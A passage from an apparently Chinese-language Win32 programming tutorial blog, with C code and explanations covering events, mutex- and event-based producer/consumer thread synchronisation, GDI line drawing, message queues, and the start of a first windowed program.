class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">HANDLE e_event;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParameter)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 等待事件</span></span><br><span class="line">    WaitForSingleObject(e_event, INFINITE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ThreadProc - running ...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProcB</span><span class="params">(LPVOID lpParameter)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 等待事件</span></span><br><span class="line">    WaitForSingleObject(e_event, INFINITE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ThreadProcB - running ...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 第二个参数，FALSE表示非通知类型通知，也就是互斥；TRUE则表示为通知类型</span></span><br><span class="line">    <span class="comment">// 第三个参数表示初始状态没有信号</span></span><br><span class="line">    e_event = CreateEvent(<span class="literal">NULL</span>, <span class="literal">true</span>, FALSE, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建2个线程</span></span><br><span class="line">    HANDLE hThread[<span class="number">2</span>];</span><br><span class="line">    hThread[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    hThread[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProcB, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//这里他并没有执行ThreadProc和ThreadProcB</span></span><br><span class="line">    Sleep(<span class="number">1000</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置事件为已通知，也就是设置为有信号，之后才跑</span></span><br><span class="line">    SetEvent(e_event);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待线程执行结束，销毁内核对象</span></span><br><span class="line">    WaitForMultipleObjects(<span class="number">2</span>, hThread, TRUE, INFINITE);</span><br><span class="line">    CloseHandle(hThread[<span class="number">0</span>]);</span><br><span class="line">    CloseHandle(hThread[<span class="number">1</span>]);</span><br><span class="line">    CloseHandle(e_event);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线程同步">线程同步</h2><p><strong>线程互斥</strong>：线程互斥是指对于共享的进程系统资源，在各单个线程访问时的排它性；当有若干个线程都要使用某一共享资源时，任何时刻最多只允许一个线程去使用，其它要使用该资源的线程必须等待，直到占用资源者释放该资源。</p><p><strong>线程同步</strong>： 线程同步是指线程之间所具有的一种制约关系，一个线程的执行依赖另一个线程的消息，当它没有得到另一个线程的消息时应等待，直到消息到达时才被唤醒；同步的前提是互斥，其次就是有序，<strong>互斥并不代表A线程访问临界资源后就一定是B线程再去访问，也有可能是A线程，这就是属于无序的状态</strong>，所以同步就是<strong>互斥加上有序</strong>。</p><h3 id="使用互斥体实现">使用互斥体实现</h3><p>会有很多cpu时间浪费掉：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 容器</span></span><br><span class="line"><span class="keyword">int</span> container;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 次数</span></span><br><span class="line"><span class="keyword">int</span> count = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 互斥体</span></span><br><span class="line">HANDLE hMutex;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生产者</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParameter)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (container==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 等待互斥体，获取令牌</span></span><br><span class="line">            WaitForSingleObject(hMutex, INFINITE);</span><br><span class="line">            <span class="comment">// 获取当前进程ID</span></span><br><span class="line">            <span class="keyword">int</span> threadId = GetCurrentThreadId();</span><br><span class="line">            <span class="comment">// 生产存放进容器</span></span><br><span class="line">            container = <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;++Thread: %d, Build: %d \n&quot;</span>, threadId, container);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            i--;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;----------------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        ReleaseMutex(hMutex);</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 消费者</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProcB</span><span class="params">(LPVOID lpParameter)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (container==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 等待互斥体，获取令牌</span></span><br><span class="line">            WaitForSingleObject(hMutex, INFINITE);</span><br><span class="line">            <span class="comment">// 获取当前进程ID</span></span><br><span class="line">            <span class="keyword">int</span> threadId = GetCurrentThreadId();</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;--Thread: %d, Consume: %d \n&quot;</span>, threadId, container);</span><br><span class="line">            <span class="comment">// 消费</span></span><br><span class="line">            container = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            i--;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;+++++++++++++++\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 释放令牌</span></span><br><span class="line">        ReleaseMutex(hMutex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 创建互斥体</span></span><br><span class="line">    hMutex = CreateMutex(<span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建2个线程</span></span><br><span class="line">    HANDLE hThread[<span class="number">2</span>];</span><br><span class="line">    hThread[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    hThread[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProcB, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    WaitForMultipleObjects(<span class="number">2</span>, hThread, TRUE, INFINITE);</span><br><span class="line">    CloseHandle(hThread[<span class="number">0</span>]);</span><br><span class="line">    CloseHandle(hThread[<span class="number">1</span>]);</span><br><span class="line">    CloseHandle(hMutex);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220404141649827.png" alt="image-20220404141649827"><figcaption aria-hidden="true">image-20220404141649827</figcaption></figure><p>为了防止cpu时间的浪费，使用事件可以完美解决</p><h3 id="事件-1">事件</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 容器</span></span><br><span class="line"><span class="keyword">int</span> container;</span><br><span class="line"><span class="comment">// 次数</span></span><br><span class="line"><span class="keyword">int</span> count = <span class="number">10</span>;</span><br><span class="line">HANDLE eventa, eventb;</span><br><span class="line"><span class="comment">// 生产者</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 等待互斥体，获取令牌</span></span><br><span class="line">        WaitForSingleObject(eventa, INFINITE);</span><br><span class="line">        <span class="comment">// 获取当前进程ID</span></span><br><span class="line">        <span class="keyword">int</span> threadId = GetCurrentThreadId();</span><br><span class="line">        <span class="comment">// 生产存放进容器</span></span><br><span class="line">        container = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;++Thread: %d, Build: %d \n&quot;</span>, threadId, container);</span><br><span class="line"></span><br><span class="line">        SetEvent(eventb);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 消费者</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProcB</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 等待互斥体，获取令牌</span></span><br><span class="line">        WaitForSingleObject(eventb, INFINITE);</span><br><span class="line">        <span class="comment">// 获取当前进程ID</span></span><br><span class="line">        <span class="keyword">int</span> threadId = GetCurrentThreadId();</span><br><span class="line">        container = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;--Thread: %d, Consume: %d \n&quot;</span>, threadId, container);</span><br><span class="line">        <span class="comment">// 消费</span></span><br><span class="line"></span><br><span class="line">        SetEvent(eventa);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    eventa = CreateEvent(<span class="literal">NULL</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">NULL</span>);</span><br><span class="line">    eventb = CreateEvent(<span class="literal">NULL</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// 创建2个线程</span></span><br><span class="line">    HANDLE hThread[<span class="number">2</span>];</span><br><span class="line">    hThread[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    hThread[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProcB, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    WaitForMultipleObjects(<span class="number">2</span>, hThread, TRUE, INFINITE);</span><br><span class="line">    CloseHandle(hThread[<span class="number">0</span>]);</span><br><span class="line">    CloseHandle(hThread[<span class="number">1</span>]);</span><br><span class="line">    CloseHandle(eventa);</span><br><span class="line">    CloseHandle(eventb);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220404142455729.png" alt="image-20220404142455729"><figcaption aria-hidden="true">image-20220404142455729</figcaption></figure><h1 id="窗口">窗口</h1><p>内核层也有模块：</p><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220404142900172.png" alt="image-20220404142900172"><figcaption aria-hidden="true">image-20220404142900172</figcaption></figure><p>Handle是私有的。</p><p>hwnd是全局的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HWND hWnd; <span class="comment">// 窗口句柄</span></span><br><span class="line">    HDC hDc;   <span class="comment">// 设备上下文对象</span></span><br><span class="line">    HPEN hPen; <span class="comment">// 画笔</span></span><br><span class="line">    <span class="comment">// 1. 设备对象，要绘画的位置</span></span><br><span class="line">    <span class="comment">// 设置为NULL则表示在桌面中绘画</span></span><br><span class="line">    hWnd = (HWND)<span class="number">0x000C058A</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 获取设备的上下文对象（DC）</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        语法格式：</span></span><br><span class="line"><span class="comment">        HDC GetDC(</span></span><br><span class="line"><span class="comment">            HWND hWnd   // handle to window</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    hDc = <span class="built_in">GetDC</span>(hWnd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 创建画笔，设置线条的属性</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        语法格式：</span></span><br><span class="line"><span class="comment">        HPEN CreatePen(</span></span><br><span class="line"><span class="comment">            int fnPenStyle,    // pen style</span></span><br><span class="line"><span class="comment">            int nWidth,        // pen width</span></span><br><span class="line"><span class="comment">            COLORREF crColor   // pen color</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    hPen = <span class="built_in">CreatePen</span>(PS_SOLID, <span class="number">5</span>, <span class="built_in">RGB</span>(<span class="number">0xFF</span>, <span class="number">00</span>, <span class="number">00</span>)); <span class="comment">// RGB表示红绿蓝，红绿蓝的组合就可以组成新的一种颜色。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 关联</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        语法格式：</span></span><br><span class="line"><span class="comment">        HGDIOBJ SelectObject(</span></span><br><span class="line"><span class="comment">            HDC hdc,          // handle to DC</span></span><br><span class="line"><span class="comment">            HGDIOBJ hgdiobj   // handle to object</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">SelectObject</span>(hDc, hPen);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 开始画线</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        语法格式：</span></span><br><span class="line"><span class="comment">        BOOL LineTo(</span></span><br><span class="line"><span class="comment">            HDC hdc,    // device context handle</span></span><br><span class="line"><span class="comment">            int nXEnd,  // x-coordinate of ending point</span></span><br><span class="line"><span class="comment">            int nYEnd   // y-coordinate of ending point</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">LineTo</span>(hDc, <span class="number">400</span>, <span class="number">400</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 释放资源</span></span><br><span class="line">    <span class="built_in">DeleteObject</span>(hPen);</span><br><span class="line">    <span class="built_in">ReleaseDC</span>(hWnd, hDc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="消息队列">消息队列</h1><p>消息：当我们点击鼠标的时候，或者当我们按下键盘的时候，操作系统都要把这些动作记录下来，存储到一个结构体中，这个<strong>结构体</strong>就是消息。</p><p>消息队列：<strong>每个线程</strong>只有一个消息队列。</p><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220404145930395.png" alt="image-20220404145930395"><figcaption aria-hidden="true">image-20220404145930395</figcaption></figure><h1 id="第一个windows程序">第一个Windows程序</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HINSTANCE hInstance,      <span class="comment">// handle to current instance,指向模块的句柄，实际上这个值就是模块在进程空间内的内存地址</span></span></span></span><br><span class="line"><span class="params"><span class="function">  HINSTANCE hPrevInstance,  <span class="comment">// handle to previous instance,该参数永远为空NULL，无需理解</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPSTR lpCmdLine,          <span class="comment">// command line</span></span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">int</span> nCmdShow              <span class="comment">// show state</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="调试信息输出">调试信息输出</h2><p>不使用printf，使用OutputDebugString</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">void OutputDebugString(</span><br><span class="line">  LPCTSTR lpOutputString</span><br><span class="line">);</span><br></pre></td></tr></table></figure><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220404151609675.png" alt="image-20220404151609675"><figcaption aria-hidden="true">image-20220404151609675</figcaption></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 窗口函数定义</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 必须要调用一个默认的消息处理函数，关闭、最小化、最大化都是由默认消息处理函数处理的</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hwnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> APIENTRY <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">    HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSTR     lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">int</span>       nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> szOutBuff[<span class="number">0x80</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 定义创建的窗口(创建注册窗口类)</span></span><br><span class="line">    TCHAR className[] = <span class="built_in">TEXT</span>(<span class="string">&quot;My First Window&quot;</span>);</span><br><span class="line">    WNDCLASS wndClass = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="comment">// 设置窗口背景色</span></span><br><span class="line">    wndClass.hbrBackground = (HBRUSH)COLOR_BACKGROUND;</span><br><span class="line">    <span class="comment">// 设置类名字</span></span><br><span class="line">    wndClass.lpszClassName = className;</span><br><span class="line">    <span class="comment">// 设置模块地址</span></span><br><span class="line">    wndClass.hInstance = hInstance;</span><br><span class="line">    <span class="comment">// 处理消息的窗口函数</span></span><br><span class="line">    wndClass.lpfnWndProc = WindowProc; <span class="comment">// 不是调用函数，只是告诉操作系统，当前窗口对应的窗口回调函数是什么</span></span><br><span class="line">    <span class="comment">// 注册窗口类</span></span><br><span class="line">    <span class="built_in">RegisterClass</span>(&amp;wndClass);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 创建并显示窗口</span></span><br><span class="line">    <span class="comment">// 创建窗口</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    CreateWindow 语法格式：</span></span><br><span class="line"><span class="comment">    HWND CreateWindow(</span></span><br><span class="line"><span class="comment">        LPCTSTR lpClassName,  // registered class name 类名字</span></span><br><span class="line"><span class="comment">        LPCTSTR lpWindowName, // window name 窗口名字</span></span><br><span class="line"><span class="comment">        DWORD dwStyle,        // window style 窗口外观的样式</span></span><br><span class="line"><span class="comment">        int x,                // horizontal position of window 相对于父窗口x坐标</span></span><br><span class="line"><span class="comment">        int y,                // vertical position of window 相对于父窗口y坐标</span></span><br><span class="line"><span 